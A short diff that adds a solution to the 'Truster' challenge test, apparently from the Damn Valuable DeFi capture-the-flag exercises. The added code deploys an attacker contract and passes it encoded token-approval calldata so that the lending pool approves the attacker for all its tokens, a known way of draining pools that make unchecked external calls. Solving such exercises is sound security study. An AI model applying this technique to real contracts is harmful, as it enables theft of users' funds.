@@ -23,6 +23,12 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const attacker = await (await ethers.getContractFactory('PoolAttacker', player)).deploy(pool.address, token.address);
+
+        const interface = (await ethers.getContractFactory('DamnValuableToken')).interface;
+        const data = interface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL]);
+
+        await attacker.connect(player).attack(data, player.address);
     });
 
     after(async function () {
